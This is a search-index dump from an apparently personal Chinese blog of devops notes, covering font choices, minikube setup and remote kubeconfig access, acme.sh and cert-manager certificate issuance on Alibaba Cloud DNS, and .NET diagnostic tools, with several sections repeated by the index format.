","date":"2023-08-18","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E5%AD%97%E4%BD%93%E7%9F%A5%E8%AF%86/:2:2","series":null,"tags":["blog"],"title":"字体知识","uri":"/posts/%E7%AC%94%E8%AE%B0/%E5%AD%97%E4%BD%93%E7%9F%A5%E8%AF%86/#字体风格"},{"categories":["blog"],"content":" 字体宽度 等宽字体 (monospaced font) : 字符宽度相同的字体 比例字体 (proportional font): 字符宽度不尽相同 窄字体 (narrow font) 紧缩字体 (condensed font) 可变字体宽度 (font width variation) ","date":"2023-08-18","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E5%AD%97%E4%BD%93%E7%9F%A5%E8%AF%86/:2:3","series":null,"tags":["blog"],"title":"字体知识","uri":"/posts/%E7%AC%94%E8%AE%B0/%E5%AD%97%E4%BD%93%E7%9F%A5%E8%AF%86/#字体宽度"},{"categories":["blog"],"content":" 汉字字形 CL: 旧类型 SC: 简体中文 TC: 繁体, 台湾中文 HC: 香港, 澳门中文 J: 日文 K: 韩文 ","date":"2023-08-18","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E5%AD%97%E4%BD%93%E7%9F%A5%E8%AF%86/:2:4","series":null,"tags":["blog"],"title":"字体知识","uri":"/posts/%E7%AC%94%E8%AE%B0/%E5%AD%97%E4%BD%93%E7%9F%A5%E8%AF%86/#汉字字形"},{"categories":["blog"],"content":" 字体衬线 slab ","date":"2023-08-18","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E5%AD%97%E4%BD%93%E7%9F%A5%E8%AF%86/:2:5","series":null,"tags":["blog"],"title":"字体知识","uri":"/posts/%E7%AC%94%E8%AE%B0/%E5%AD%97%E4%BD%93%E7%9F%A5%E8%AF%86/#字体衬线-slab"},{"categories":["blog"],"content":" 字体选择 Releases · jonz94/Sarasa-Gothic-Nerd-Fonts Firacode Inconsolata Noto Sans SC Ubuntu Mono Source Code Pro 微软雅黑+Ubuntu Mono? 更纱黑体+Inconsolata? Ubuntu Mono 和微软雅黑不是中英文 2:1,所以对不齐. 很多英文字体的设计是 0.6 倍中文，而不是 0.5，所以就对不齐。如果英文是 0.5, 那就会对的起 ","date":"2023-08-18","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E5%AD%97%E4%BD%93%E7%9F%A5%E8%AF%86/:3:0","series":null,"tags":["blog"],"title":"字体知识","uri":"/posts/%E7%AC%94%E8%AE%B0/%E5%AD%97%E4%BD%93%E7%9F%A5%E8%AF%86/#字体选择"},{"categories":["blog"],"content":" 相关链接 更纱黑体这么多版本，要怎么选？ - 知乎 Programming Fonts - Test Drive 可以对比多个流行的字体, 没有更纱 ","date":"2023-08-18","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E5%AD%97%E4%BD%93%E7%9F%A5%E8%AF%86/:4:0","series":null,"tags":["blog"],"title":"字体知识","uri":"/posts/%E7%AC%94%E8%AE%B0/%E5%AD%97%E4%BD%93%E7%9F%A5%E8%AF%86/#相关链接"},{"categories":["point"],"content":"kubectl 是操作 k8s 的常用命令工具. 要点: 官方安装文档 官方工具 开源, 免费 ","date":"2023-08-17","objectID":"/posts/%E7%AC%94%E8%AE%B0/point/kubectl/:0:0","series":null,"tags":["point","kubectl"],"title":"kubectl","uri":"/posts/%E7%AC%94%E8%AE%B0/point/kubectl/#"},{"categories":["point"],"content":"minikube 是一个快速创建开发/测试环境 k8s 的工具. 要点: 开源, 官方 用户量大 ","date":"2023-08-17","objectID":"/posts/%E7%AC%94%E8%AE%B0/point/minikube/:0:0","series":null,"tags":["point","minikube"],"title":"minikube","uri":"/posts/%E7%AC%94%E8%AE%B0/point/minikube/#"},{"categories":["blog"],"content":"这里记录 [[笔记/point/minikube|minikube]] 的一些配置和用法.","date":"2023-08-17","objectID":"/posts/%E7%AC%94%E8%AE%B0/minikube%E6%95%99%E7%A8%8B/","series":null,"tags":["blog","minikube"],"title":"minikube教程","uri":"/posts/%E7%AC%94%E8%AE%B0/minikube%E6%95%99%E7%A8%8B/"},{"categories":["blog"],"content":" 简介这里记录 minikube 的一些配置和用法. ","date":"2023-08-17","objectID":"/posts/%E7%AC%94%E8%AE%B0/minikube%E6%95%99%E7%A8%8B/:1:0","series":null,"tags":["blog","minikube"],"title":"minikube教程","uri":"/posts/%E7%AC%94%E8%AE%B0/minikube%E6%95%99%E7%A8%8B/#简介"},{"categories":["blog"],"content":" 内容","date":"2023-08-17","objectID":"/posts/%E7%AC%94%E8%AE%B0/minikube%E6%95%99%E7%A8%8B/:2:0","series":null,"tags":["blog","minikube"],"title":"minikube教程","uri":"/posts/%E7%AC%94%E8%AE%B0/minikube%E6%95%99%E7%A8%8B/#内容"},{"categories":["blog"],"content":" 前置条件 安装好 kubectl 安装好 docker 一个良好的网络. 例如提前部署一个 clash代理 内存, cpu, 磁盘宽裕一点 ","date":"2023-08-17","objectID":"/posts/%E7%AC%94%E8%AE%B0/minikube%E6%95%99%E7%A8%8B/:2:1","series":null,"tags":["blog","minikube"],"title":"minikube教程","uri":"/posts/%E7%AC%94%E8%AE%B0/minikube%E6%95%99%E7%A8%8B/#前置条件"},{"categories":["blog"],"content":" 命令配置官方文档在这 # 下载下来 curl -LO https://storage.googleapis.com/minikube/releases/latest/minikube-linux-amd64 # 类似mv安装,但保留了权限 install minikube-linux-amd64 /usr/local/bin/minikube ","date":"2023-08-17","objectID":"/posts/%E7%AC%94%E8%AE%B0/minikube%E6%95%99%E7%A8%8B/:2:2","series":null,"tags":["blog","minikube"],"title":"minikube教程","uri":"/posts/%E7%AC%94%E8%AE%B0/minikube%E6%95%99%E7%A8%8B/#命令配置"},{"categories":["blog"],"content":" 使用 启动 # 外部机器访问 --apiserver-ips=minikube机器ip # 监听接收 --listen-address=0.0.0.0 # 不限制cpu,默认是2 --cpus='max' # 节点数量 --nodes 3 # 内存大小 --memory 4096 或者 max # root启动需要使用--force # --docker-env 使用代理 # --kubernetes-version v1.7.0 # apiserver添加额外参数 --extra-config=apiserver.feature-gates=RemoveSelfLink=false minikube start --cpus='max' --memory max --force --listen-address=0.0.0.0 --apiserver-ips=minikube机器ip --docker-env HTTP_PROXY=${http_proxy} --docker-env HTTPS_PROXY=${https_proxy} --docker-env NO_PROXY=localhost,10.0.0.0/8,172.16.0.0/12,192.168.0.0/16,*.test.example.com 启用 ingress推荐使用 yml安装Ingress 如果网络不佳，不推荐使用 addons minikube addons enable ingress 使用中 # 查看所有集群 minikube profile list # 节点操作 minikube node add|start|stop|delete|list 使用后 # 删除minikube集群, --all 删除所有集群 minikube delete ","date":"2023-08-17","objectID":"/posts/%E7%AC%94%E8%AE%B0/minikube%E6%95%99%E7%A8%8B/:2:3","series":null,"tags":["blog","minikube"],"title":"minikube教程","uri":"/posts/%E7%AC%94%E8%AE%B0/minikube%E6%95%99%E7%A8%8B/#使用"},{"categories":["blog"],"content":" 使用 启动 # 外部机器访问 --apiserver-ips=minikube机器ip # 监听接收 --listen-address=0.0.0.0 # 不限制cpu,默认是2 --cpus='max' # 节点数量 --nodes 3 # 内存大小 --memory 4096 或者 max # root启动需要使用--force # --docker-env 使用代理 # --kubernetes-version v1.7.0 # apiserver添加额外参数 --extra-config=apiserver.feature-gates=RemoveSelfLink=false minikube start --cpus='max' --memory max --force --listen-address=0.0.0.0 --apiserver-ips=minikube机器ip --docker-env HTTP_PROXY=${http_proxy} --docker-env HTTPS_PROXY=${https_proxy} --docker-env NO_PROXY=localhost,10.0.0.0/8,172.16.0.0/12,192.168.0.0/16,*.test.example.com 启用 ingress推荐使用 yml安装Ingress 如果网络不佳，不推荐使用 addons minikube addons enable ingress 使用中 # 查看所有集群 minikube profile list # 节点操作 minikube node add|start|stop|delete|list 使用后 # 删除minikube集群, --all 删除所有集群 minikube delete ","date":"2023-08-17","objectID":"/posts/%E7%AC%94%E8%AE%B0/minikube%E6%95%99%E7%A8%8B/:2:3","series":null,"tags":["blog","minikube"],"title":"minikube教程","uri":"/posts/%E7%AC%94%E8%AE%B0/minikube%E6%95%99%E7%A8%8B/#启动"},{"categories":["blog"],"content":" 使用 启动 # 外部机器访问 --apiserver-ips=minikube机器ip # 监听接收 --listen-address=0.0.0.0 # 不限制cpu,默认是2 --cpus='max' # 节点数量 --nodes 3 # 内存大小 --memory 4096 或者 max # root启动需要使用--force # --docker-env 使用代理 # --kubernetes-version v1.7.0 # apiserver添加额外参数 --extra-config=apiserver.feature-gates=RemoveSelfLink=false minikube start --cpus='max' --memory max --force --listen-address=0.0.0.0 --apiserver-ips=minikube机器ip --docker-env HTTP_PROXY=${http_proxy} --docker-env HTTPS_PROXY=${https_proxy} --docker-env NO_PROXY=localhost,10.0.0.0/8,172.16.0.0/12,192.168.0.0/16,*.test.example.com 启用 ingress推荐使用 yml安装Ingress 如果网络不佳，不推荐使用 addons minikube addons enable ingress 使用中 # 查看所有集群 minikube profile list # 节点操作 minikube node add|start|stop|delete|list 使用后 # 删除minikube集群, --all 删除所有集群 minikube delete ","date":"2023-08-17","objectID":"/posts/%E7%AC%94%E8%AE%B0/minikube%E6%95%99%E7%A8%8B/:2:3","series":null,"tags":["blog","minikube"],"title":"minikube教程","uri":"/posts/%E7%AC%94%E8%AE%B0/minikube%E6%95%99%E7%A8%8B/#启用-ingress"},{"categories":["blog"],"content":" 使用 启动 # 外部机器访问 --apiserver-ips=minikube机器ip # 监听接收 --listen-address=0.0.0.0 # 不限制cpu,默认是2 --cpus='max' # 节点数量 --nodes 3 # 内存大小 --memory 4096 或者 max # root启动需要使用--force # --docker-env 使用代理 # --kubernetes-version v1.7.0 # apiserver添加额外参数 --extra-config=apiserver.feature-gates=RemoveSelfLink=false minikube start --cpus='max' --memory max --force --listen-address=0.0.0.0 --apiserver-ips=minikube机器ip --docker-env HTTP_PROXY=${http_proxy} --docker-env HTTPS_PROXY=${https_proxy} --docker-env NO_PROXY=localhost,10.0.0.0/8,172.16.0.0/12,192.168.0.0/16,*.test.example.com 启用 ingress推荐使用 yml安装Ingress 如果网络不佳，不推荐使用 addons minikube addons enable ingress 使用中 # 查看所有集群 minikube profile list # 节点操作 minikube node add|start|stop|delete|list 使用后 # 删除minikube集群, --all 删除所有集群 minikube delete ","date":"2023-08-17","objectID":"/posts/%E7%AC%94%E8%AE%B0/minikube%E6%95%99%E7%A8%8B/:2:3","series":null,"tags":["blog","minikube"],"title":"minikube教程","uri":"/posts/%E7%AC%94%E8%AE%B0/minikube%E6%95%99%E7%A8%8B/#使用中"},{"categories":["blog"],"content":" 使用 启动 # 外部机器访问 --apiserver-ips=minikube机器ip # 监听接收 --listen-address=0.0.0.0 # 不限制cpu,默认是2 --cpus='max' # 节点数量 --nodes 3 # 内存大小 --memory 4096 或者 max # root启动需要使用--force # --docker-env 使用代理 # --kubernetes-version v1.7.0 # apiserver添加额外参数 --extra-config=apiserver.feature-gates=RemoveSelfLink=false minikube start --cpus='max' --memory max --force --listen-address=0.0.0.0 --apiserver-ips=minikube机器ip --docker-env HTTP_PROXY=${http_proxy} --docker-env HTTPS_PROXY=${https_proxy} --docker-env NO_PROXY=localhost,10.0.0.0/8,172.16.0.0/12,192.168.0.0/16,*.test.example.com 启用 ingress推荐使用 yml安装Ingress 如果网络不佳，不推荐使用 addons minikube addons enable ingress 使用中 # 查看所有集群 minikube profile list # 节点操作 minikube node add|start|stop|delete|list 使用后 # 删除minikube集群, --all 删除所有集群 minikube delete ","date":"2023-08-17","objectID":"/posts/%E7%AC%94%E8%AE%B0/minikube%E6%95%99%E7%A8%8B/:2:3","series":null,"tags":["blog","minikube"],"title":"minikube教程","uri":"/posts/%E7%AC%94%E8%AE%B0/minikube%E6%95%99%E7%A8%8B/#使用后"},{"categories":["blog"],"content":" 远程访问 启动过程中必须添加参数 –apiserver-ips=minikube 机器 ip –listen-address=0.0.0.0 复制配置文件 ~/.kube/config 到本地. 通过 base64 -w 0 -i 拿到对应的 data 值. echo ; echo certificate-authority-data ; base64 -w 0 -i /root/.minikube/ca.crt; echo -e \"\\n\\n\" \\ echo client-certificate-data ; base64 -w 0 -i /root/.minikube/profiles/minikube/client.crt; echo -e \"\\n\\n\" \\ echo client-key-data ; base64 -w 0 -i /root/.minikube/profiles/minikube/client.key; echo -e \"\\n\\n\" 通过 docker port minikube(集群主节点容器名称) 拿到 8443 指向的端口. 例如 8443/tcp -\u003e 0.0.0.0:32769,则端口填 32769. 把 2 和 4 的值填入本地 config 文件中. apiVersion: v1 clusters: - cluster: # certificate-authority: /xxx # base64 -w 0 -i /xxx 得到 ooo== certificate-authority-data: ooo== extensions: - extension: last-update: Tue, 22 Aug 2023 11:04:25 CST provider: minikube.sigs.k8s.io version: v1.30.1 name: cluster_info server: https://minikube机器ip:端口 name: minikube contexts: - context: cluster: minikube extensions: - extension: last-update: Tue, 22 Aug 2023 11:04:25 CST provider: minikube.sigs.k8s.io version: v1.30.1 name: context_info namespace: default user: minikube name: minikube current-context: minikube kind: Config preferences: {} users: - name: minikube user: client-certificate-data: # 取base64 client-certificate client-key-data: # 取base64 client-key ","date":"2023-08-17","objectID":"/posts/%E7%AC%94%E8%AE%B0/minikube%E6%95%99%E7%A8%8B/:2:4","series":null,"tags":["blog","minikube"],"title":"minikube教程","uri":"/posts/%E7%AC%94%E8%AE%B0/minikube%E6%95%99%E7%A8%8B/#远程访问"},{"categories":["blog"],"content":"ACME 是一个自动签发 [[笔记/point/ssl|ssl]] 证书的协议. 而 [acme.sh](https://github.com/acmesh-official/acme.sh.git) 是实现了这个协议, 同时对接了多家证书提供商的项目.","date":"2023-08-16","objectID":"/posts/%E7%AC%94%E8%AE%B0/acme/","series":null,"tags":["blog","devops","ACME"],"title":"ACME","uri":"/posts/%E7%AC%94%E8%AE%B0/acme/"},{"categories":["blog"],"content":" 简介ACME 是一个自动签发 ssl 证书的协议. 而 acme.sh 是实现了这个协议, 同时对接了多家证书提供商的项目. ","date":"2023-08-16","objectID":"/posts/%E7%AC%94%E8%AE%B0/acme/:1:0","series":null,"tags":["blog","devops","ACME"],"title":"ACME","uri":"/posts/%E7%AC%94%E8%AE%B0/acme/#简介"},{"categories":["blog"],"content":" ACME.SH","date":"2023-08-16","objectID":"/posts/%E7%AC%94%E8%AE%B0/acme/:2:0","series":null,"tags":["blog","devops","ACME"],"title":"ACME","uri":"/posts/%E7%AC%94%E8%AE%B0/acme/#acmesh"},{"categories":["blog"],"content":" 安装使用配置 阿里云 的密钥对 export Ali_Key=\"ak\" export Ali_Secret=\"sk\" 开始安装 # 安装 apt install socat -y git clone https://github.com/acmesh-official/acme.sh.git cd ./acme.sh ./acme.sh --install -m 我的邮箱 source ~/.bashrc # 生成证书 # -k, --keylength 通过长度指定算法 Specifies the domain key length: 2048, 3072, 4096, 8192 or ec-256, ec-384, ec-521. acme.sh --issue --dns dns_ali -d \"*.kentxxq.com\" -d \"kentxxq.com\" # 安装证书 acme.sh --install-cert \\ -d \"*.kentxxq.com\" -d \"kentxxq.com\" \\ --key-file /usr/local/nginx/conf/ssl/kentxxq.key \\ --fullchain-file /usr/local/nginx/conf/ssl/kentxxq.cer \\ --reloadcmd \"/usr/local/nginx/sbin/nginx -s reload\" ","date":"2023-08-16","objectID":"/posts/%E7%AC%94%E8%AE%B0/acme/:2:1","series":null,"tags":["blog","devops","ACME"],"title":"ACME","uri":"/posts/%E7%AC%94%E8%AE%B0/acme/#安装使用"},{"categories":["blog"],"content":" 强刷证书 acme.sh --renew -d \"*.kentxxq.com\" -d \"kentxxq.com\" --force --server letsencrypt acme.sh --renew-all --force ","date":"2023-08-16","objectID":"/posts/%E7%AC%94%E8%AE%B0/acme/:2:2","series":null,"tags":["blog","devops","ACME"],"title":"ACME","uri":"/posts/%E7%AC%94%E8%AE%B0/acme/#强刷证书"},{"categories":["blog"],"content":" 删除证书 acme.sh --remove -d \"*.kentxxq.com\" -d \"kentxxq.com\" --force ","date":"2023-08-16","objectID":"/posts/%E7%AC%94%E8%AE%B0/acme/:2:3","series":null,"tags":["blog","devops","ACME"],"title":"ACME","uri":"/posts/%E7%AC%94%E8%AE%B0/acme/#删除证书"},{"categories":["blog"],"content":" 修改 CA 服务商 支持的CA服务商列表 各个服务商的区别 acme.sh --set-default-ca --server letsencrypt ","date":"2023-08-16","objectID":"/posts/%E7%AC%94%E8%AE%B0/acme/:2:4","series":null,"tags":["blog","devops","ACME"],"title":"ACME","uri":"/posts/%E7%AC%94%E8%AE%B0/acme/#修改-ca-服务商"},{"categories":["blog"],"content":" 定时更新 # 自动更新acme.sh acme --upgrade --auto-upgrade # 自动更新证书 acme.sh --install-cronjob ","date":"2023-08-16","objectID":"/posts/%E7%AC%94%E8%AE%B0/acme/:2:5","series":null,"tags":["blog","devops","ACME"],"title":"ACME","uri":"/posts/%E7%AC%94%E8%AE%B0/acme/#定时更新"},{"categories":["blog"],"content":" 卸载 acme.sh --uninstall rm -rf ~/.acme.sh ","date":"2023-08-16","objectID":"/posts/%E7%AC%94%E8%AE%B0/acme/:2:6","series":null,"tags":["blog","devops","ACME"],"title":"ACME","uri":"/posts/%E7%AC%94%E8%AE%B0/acme/#卸载"},{"categories":["blog"],"content":" ACME.SH 问题处理 多个域名,同 dns 服务商,不同 ak创建多个 account.conf 文件, 然后编辑 crontab. 假设你有 a.com, b.com, 而a.com 和 b.com 都是阿里云提供 dns 解析, 但是需要用到不同的 ak/sk 操作如下: acme 正常获取 a.com 的证书 备份一下 cp /root/.acme.sh/account.conf /root/.acme.sh/account.conf.bak acme 正常获取 b.com 的证书. 此时 /root/.acme.sh/account.conf 的内容变成了 b.com 的配置 开始配置: mv /root/.acme.sh/account.conf /root/.acme.sh/account_b.conf 重命名配置文件，这是 b.com 的 ak/sk. mv /root/.acme.sh/account.conf.bak /root/.acme.sh/account.conf 恢复原来的配置文件，这是 a.com 的 ak/sk. 开始配置 crontab 定时任务 第一条 crontab记录 刷新 a.com 证书成功, b.com 会失败. 第二条 crontab记录 会发现 a.com 证书已经不需要刷新了, 只会刷新 b.com 的证书. 38 0 * * * \"/root/.acme.sh\"/acme.sh --cron --home \"/root/.acme.sh\" \u003e /dev/null 4 5 * * * \"/root/.acme.sh\"/acme.sh --cron --accountconf \"/root/.acme.sh/account_b.conf\" --home \"/root/.acme.sh\" \u003e /dev/null curl error code出现 Please refer to https://curl.haxx.se/libcurl/c/libcurl-errors.html for error code 这样的错误. 通常是因为不认可 acme-server 的证书. 使用 --insecure 不检查服务器证书 使用 --use-wget ,排除是 curl 的问题 修改 reload-cmd重新运行 --install-cert 命令即可覆盖。sync_nginx.sh 的内容 在这里 acme.sh --install-cert \\ -d \"*.kentxxq.com\" -d \"kentxxq.com\" \\ --key-file /usr/local/nginx/conf/ssl/kentxxq.key \\ --fullchain-file /usr/local/nginx/conf/ssl/kentxxq.cer \\ --reloadcmd \"/bin/bash /usr/local/bin/sync_nginx.sh\" ","date":"2023-08-16","objectID":"/posts/%E7%AC%94%E8%AE%B0/acme/:3:0","series":null,"tags":["blog","devops","ACME"],"title":"ACME","uri":"/posts/%E7%AC%94%E8%AE%B0/acme/#acmesh-问题处理"},{"categories":["blog"],"content":" ACME.SH 问题处理 多个域名,同 dns 服务商,不同 ak创建多个 account.conf 文件, 然后编辑 crontab. 假设你有 a.com, b.com, 而a.com 和 b.com 都是阿里云提供 dns 解析, 但是需要用到不同的 ak/sk 操作如下: acme 正常获取 a.com 的证书 备份一下 cp /root/.acme.sh/account.conf /root/.acme.sh/account.conf.bak acme 正常获取 b.com 的证书. 此时 /root/.acme.sh/account.conf 的内容变成了 b.com 的配置 开始配置: mv /root/.acme.sh/account.conf /root/.acme.sh/account_b.conf 重命名配置文件，这是 b.com 的 ak/sk. mv /root/.acme.sh/account.conf.bak /root/.acme.sh/account.conf 恢复原来的配置文件，这是 a.com 的 ak/sk. 开始配置 crontab 定时任务 第一条 crontab记录 刷新 a.com 证书成功, b.com 会失败. 第二条 crontab记录 会发现 a.com 证书已经不需要刷新了, 只会刷新 b.com 的证书. 38 0 * * * \"/root/.acme.sh\"/acme.sh --cron --home \"/root/.acme.sh\" \u003e /dev/null 4 5 * * * \"/root/.acme.sh\"/acme.sh --cron --accountconf \"/root/.acme.sh/account_b.conf\" --home \"/root/.acme.sh\" \u003e /dev/null curl error code出现 Please refer to https://curl.haxx.se/libcurl/c/libcurl-errors.html for error code 这样的错误. 通常是因为不认可 acme-server 的证书. 使用 --insecure 不检查服务器证书 使用 --use-wget ,排除是 curl 的问题 修改 reload-cmd重新运行 --install-cert 命令即可覆盖。sync_nginx.sh 的内容 在这里 acme.sh --install-cert \\ -d \"*.kentxxq.com\" -d \"kentxxq.com\" \\ --key-file /usr/local/nginx/conf/ssl/kentxxq.key \\ --fullchain-file /usr/local/nginx/conf/ssl/kentxxq.cer \\ --reloadcmd \"/bin/bash /usr/local/bin/sync_nginx.sh\" ","date":"2023-08-16","objectID":"/posts/%E7%AC%94%E8%AE%B0/acme/:3:0","series":null,"tags":["blog","devops","ACME"],"title":"ACME","uri":"/posts/%E7%AC%94%E8%AE%B0/acme/#多个域名同-dns-服务商不同-ak"},{"categories":["blog"],"content":" ACME.SH 问题处理 多个域名,同 dns 服务商,不同 ak创建多个 account.conf 文件, 然后编辑 crontab. 假设你有 a.com, b.com, 而a.com 和 b.com 都是阿里云提供 dns 解析, 但是需要用到不同的 ak/sk 操作如下: acme 正常获取 a.com 的证书 备份一下 cp /root/.acme.sh/account.conf /root/.acme.sh/account.conf.bak acme 正常获取 b.com 的证书. 此时 /root/.acme.sh/account.conf 的内容变成了 b.com 的配置 开始配置: mv /root/.acme.sh/account.conf /root/.acme.sh/account_b.conf 重命名配置文件，这是 b.com 的 ak/sk. mv /root/.acme.sh/account.conf.bak /root/.acme.sh/account.conf 恢复原来的配置文件，这是 a.com 的 ak/sk. 开始配置 crontab 定时任务 第一条 crontab记录 刷新 a.com 证书成功, b.com 会失败. 第二条 crontab记录 会发现 a.com 证书已经不需要刷新了, 只会刷新 b.com 的证书. 38 0 * * * \"/root/.acme.sh\"/acme.sh --cron --home \"/root/.acme.sh\" \u003e /dev/null 4 5 * * * \"/root/.acme.sh\"/acme.sh --cron --accountconf \"/root/.acme.sh/account_b.conf\" --home \"/root/.acme.sh\" \u003e /dev/null curl error code出现 Please refer to https://curl.haxx.se/libcurl/c/libcurl-errors.html for error code 这样的错误. 通常是因为不认可 acme-server 的证书. 使用 --insecure 不检查服务器证书 使用 --use-wget ,排除是 curl 的问题 修改 reload-cmd重新运行 --install-cert 命令即可覆盖。sync_nginx.sh 的内容 在这里 acme.sh --install-cert \\ -d \"*.kentxxq.com\" -d \"kentxxq.com\" \\ --key-file /usr/local/nginx/conf/ssl/kentxxq.key \\ --fullchain-file /usr/local/nginx/conf/ssl/kentxxq.cer \\ --reloadcmd \"/bin/bash /usr/local/bin/sync_nginx.sh\" ","date":"2023-08-16","objectID":"/posts/%E7%AC%94%E8%AE%B0/acme/:3:0","series":null,"tags":["blog","devops","ACME"],"title":"ACME","uri":"/posts/%E7%AC%94%E8%AE%B0/acme/#curl-error-code"},{"categories":["blog"],"content":" ACME.SH 问题处理 多个域名,同 dns 服务商,不同 ak创建多个 account.conf 文件, 然后编辑 crontab. 假设你有 a.com, b.com, 而a.com 和 b.com 都是阿里云提供 dns 解析, 但是需要用到不同的 ak/sk 操作如下: acme 正常获取 a.com 的证书 备份一下 cp /root/.acme.sh/account.conf /root/.acme.sh/account.conf.bak acme 正常获取 b.com 的证书. 此时 /root/.acme.sh/account.conf 的内容变成了 b.com 的配置 开始配置: mv /root/.acme.sh/account.conf /root/.acme.sh/account_b.conf 重命名配置文件，这是 b.com 的 ak/sk. mv /root/.acme.sh/account.conf.bak /root/.acme.sh/account.conf 恢复原来的配置文件，这是 a.com 的 ak/sk. 开始配置 crontab 定时任务 第一条 crontab记录 刷新 a.com 证书成功, b.com 会失败. 第二条 crontab记录 会发现 a.com 证书已经不需要刷新了, 只会刷新 b.com 的证书. 38 0 * * * \"/root/.acme.sh\"/acme.sh --cron --home \"/root/.acme.sh\" \u003e /dev/null 4 5 * * * \"/root/.acme.sh\"/acme.sh --cron --accountconf \"/root/.acme.sh/account_b.conf\" --home \"/root/.acme.sh\" \u003e /dev/null curl error code出现 Please refer to https://curl.haxx.se/libcurl/c/libcurl-errors.html for error code 这样的错误. 通常是因为不认可 acme-server 的证书. 使用 --insecure 不检查服务器证书 使用 --use-wget ,排除是 curl 的问题 修改 reload-cmd重新运行 --install-cert 命令即可覆盖。sync_nginx.sh 的内容 在这里 acme.sh --install-cert \\ -d \"*.kentxxq.com\" -d \"kentxxq.com\" \\ --key-file /usr/local/nginx/conf/ssl/kentxxq.key \\ --fullchain-file /usr/local/nginx/conf/ssl/kentxxq.cer \\ --reloadcmd \"/bin/bash /usr/local/bin/sync_nginx.sh\" ","date":"2023-08-16","objectID":"/posts/%E7%AC%94%E8%AE%B0/acme/:3:0","series":null,"tags":["blog","devops","ACME"],"title":"ACME","uri":"/posts/%E7%AC%94%E8%AE%B0/acme/#修改-reload-cmd"},{"categories":["blog"],"content":" cert-manager / 不可用亲测阿里云弄不好… 浪费生命… # 安装 kubectl apply -f https://github.com/cert-manager/cert-manager/releases/download/v1.14.4/cert-manager.yaml # 确认启动完成 kubectl get pods --namespace cert-manager 部署 cert-manager-alidns-webhook helm repo add cert-manager-alidns-webhook https://devmachine-fr.github.io/cert-manager-alidns-webhook helm repo update helm install alidns-webhook cert-manager-alidns-webhook/alidns-webhook -n cert-manager kubectl create secret generic alidns-secrets -n cert-manager --from-literal=\"access-token=yourtoken\" --from-literal=\"secret-key=yoursecretkey\" 创建资源 apiVersion: cert-manager.io/v1 kind: ClusterIssuer metadata: name: letsencrypt-staging namespace: cert-manager spec: acme: # Change to your letsencrypt email email: 805429509@qq.com server: https://acme-staging-v02.api.letsencrypt.org/directory privateKeySecretRef: name: letsencrypt-staging-account-key solvers: - dns01: webhook: groupName: acme.yourcompany.com solverName: alidns config: region: \"\" accessKeySecretRef: name: alidns-secret key: access-key secretKeySecretRef: name: alidns-secret key: secret-key --- apiVersion: cert-manager.io/v1 kind: Certificate metadata: name: example-tls namespace: cert-manager spec: secretName: chinnshi-com-tls commonName: chinnshi.com dnsNames: - chinnshi.com - \"*.chinnshi.com\" issuerRef: name: letsencrypt-staging kind: ClusterIssuer 创建签发工具. ClusterIssuer 和 Issuer 的区别只有 ClusterIssuer 能签发所有命名空间的证书. 相关链接 官网安装文档 kubectl apply - cert-manager Documentation 腾讯云文档 容器服务 使用 cert-manager 签发免费证书-最佳实践-文档中心-腾讯云 ","date":"2023-08-16","objectID":"/posts/%E7%AC%94%E8%AE%B0/acme/:4:0","series":null,"tags":["blog","devops","ACME"],"title":"ACME","uri":"/posts/%E7%AC%94%E8%AE%B0/acme/#cert-manager--不可用"},{"categories":["blog"],"content":" 协议学习获取目录 get https://acme.zerossl.com/v2/DV90 { \"newNonce\": \"https://acme.zerossl.com/v2/DV90/newNonce\", \"newAccount\": \"https://acme.zerossl.com/v2/DV90/newAccount\", \"newOrder\": \"https://acme.zerossl.com/v2/DV90/newOrder\", \"revokeCert\": \"https://acme.zerossl.com/v2/DV90/revokeCert\", \"keyChange\": \"https://acme.zerossl.com/v2/DV90/keyChange\", \"meta\": { \"termsOfService\": \"https://secure.trust-provider.com/repository/docs/Legacy/20221001_Certificate_Subscriber_Agreement_v_2_5_click.pdf\", \"website\": \"https://zerossl.com\", \"caaIdentities\": [ \"sectigo.com\", \"trust-provider.com\", \"usertrust.com\", \"comodoca.com\", \"comodo.com\" ], \"externalAccountRequired\": true } } 获取一个随机数 head https://acme.zerossl.com/v2/DV90/newNonce # header Replay-Nonce aEZTqdlvTqGqAiqPRdaRCXgBon1yJHFbflQ1CpTg_ZE ","date":"2023-08-16","objectID":"/posts/%E7%AC%94%E8%AE%B0/acme/:5:0","series":null,"tags":["blog","devops","ACME"],"title":"ACME","uri":"/posts/%E7%AC%94%E8%AE%B0/acme/#协议学习"},{"categories":["blog"],"content":"记录 [[笔记/point/csharp|csharp]] 的性能调试. #todo/笔记","date":"2023-08-16","objectID":"/posts/%E7%AC%94%E8%AE%B0/csharp%E6%80%A7%E8%83%BD%E8%B0%83%E8%AF%95/","series":null,"tags":["blog","csharp"],"title":"csharp性能调试","uri":"/posts/%E7%AC%94%E8%AE%B0/csharp%E6%80%A7%E8%83%BD%E8%B0%83%E8%AF%95/"},{"categories":["blog"],"content":" 简介记录 csharp 的性能调试. #todo/笔记 所有的 dotnet 全局工具在这里 .NET Diagnostic tools overview - .NET | Microsoft Learn ","date":"2023-08-16","objectID":"/posts/%E7%AC%94%E8%AE%B0/csharp%E6%80%A7%E8%83%BD%E8%B0%83%E8%AF%95/:1:0","series":null,"tags":["blog","csharp"],"title":"csharp性能调试","uri":"/posts/%E7%AC%94%E8%AE%B0/csharp%E6%80%A7%E8%83%BD%E8%B0%83%E8%AF%95/#简介"},{"categories":["blog"],"content":" 内容","date":"2023-08-16","objectID":"/posts/%E7%AC%94%E8%AE%B0/csharp%E6%80%A7%E8%83%BD%E8%B0%83%E8%AF%95/:2:0","series":null,"tags":["blog","csharp"],"title":"csharp性能调试","uri":"/posts/%E7%AC%94%E8%AE%B0/csharp%E6%80%A7%E8%83%BD%E8%B0%83%E8%AF%95/#内容"},{"categories":["blog"],"content":" 采集所有监控数据dotnet-monitor ","date":"2023-08-16","objectID":"/posts/%E7%AC%94%E8%AE%B0/csharp%E6%80%A7%E8%83%BD%E8%B0%83%E8%AF%95/:2:1","series":null,"tags":["blog","csharp"],"title":"csharp性能调试","uri":"/posts/%E7%AC%94%E8%AE%B0/csharp%E6%80%A7%E8%83%BD%E8%B0%83%E8%AF%95/#采集所有监控数据"},{"categories":["blog"],"content":" 查看 dotnet 应用 dotnet-counters.exe ps 